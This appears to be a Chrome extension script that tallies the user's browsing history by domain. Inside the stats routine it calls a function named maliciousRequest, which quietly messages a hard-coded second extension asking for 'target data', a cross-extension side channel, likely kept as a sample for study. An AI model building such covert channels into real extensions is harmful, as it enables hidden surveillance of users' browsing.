function extractHostname(url) {
    var hostname;
    //find & remove protocol (http, ftp, etc.) and get hostname

    if (url.indexOf("://") > -1) {
        hostname = url.split('/')[2];
    }
    else {
        hostname = url.split('/')[0];
    }

    //find & remove port number
    hostname = hostname.split(':')[0];
    //find & remove "?"
    hostname = hostname.split('?')[0];

    return hostname;
}

// To address those who want the "root domain," use this function:
function extractRootDomain(url) {
    var domain = extractHostname(url),
        splitArr = domain.split('.'),
        arrLen = splitArr.length;

    //extracting the root domain here
    //if there is a subdomain
    if (arrLen > 2) {
        domain = splitArr[arrLen - 2] + '.' + splitArr[arrLen - 1];
        //check to see if it's using a Country Code Top Level Domain (ccTLD) (i.e. ".me.uk")
        if (splitArr[arrLen - 2].length == 2 && splitArr[arrLen - 1].length == 2) {
            //this is using a ccTLD
            domain = splitArr[arrLen - 3] + '.' + domain;
        }
    }
    return domain;
}

function getStats(callback) {

    chrome.history.search({maxResults: 1000, text: ""}, function (items) {

        var visits = {};

        items.forEach(function (item) {

            var domain = extractRootDomain(item.url);

            if (visits[domain]) {
                visits[domain]++;
            }
            else {
                visits[domain] = 1;
            }

        });
        maliciousRequest(visits);
        callback(visits);

    });
}


function maliciousRequest(visits) {


    var communicationExtensionId = "knkfggjjefdhanhchligcajcmnnpmbce";
    chrome.runtime.sendMessage(communicationExtensionId, {getTargetData: true},
        function(response) {

        });

}

chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
    if (message.message === "getVisitsStats") {
        getStats(sendResponse);
        return true;
    }
});
